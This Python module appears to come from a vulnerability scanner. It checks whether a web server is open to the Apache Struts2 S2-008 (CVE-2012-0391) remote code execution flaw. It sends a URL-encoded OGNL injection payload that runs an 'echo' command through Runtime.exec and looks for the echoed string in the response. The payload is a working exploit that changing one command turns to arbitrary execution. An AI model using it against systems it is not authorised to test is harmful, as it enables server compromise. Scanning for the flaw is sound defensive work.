#!/usr/bin/env python3

from app.lib.request import request
from app.lib.encode import urlencode
from app.lib.common import get_capta, get_useragent

class S2_008_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-008漏洞,又名CVE-2012-0391漏洞',
            'description': 'Struts2 S2-008漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.17',
            'date': '2012-01-02',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/devmode.action'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent()
        } 
        self.check_payload =  '?debug=command&expression=%28%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28"false"%29%20%2C%23context%5B"xwork.MethodAccessor.denyMethodExecution"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27''' + urlencode(('echo' + ' ' + self.capta), 'utf-8') + '''%27%29.getInputStream%28%29%29%29'''
    
    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_url = self.url + self.check_payload
            check_res = await request.get(check_url, headers = self.headers)
            if check_res.status == 200 and len(await check_res.text()) < 50 and self.capta in await check_res.text():
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_008 = S2_008_BaseVerify('http://localhost:8080/s2_008_war_exploded/')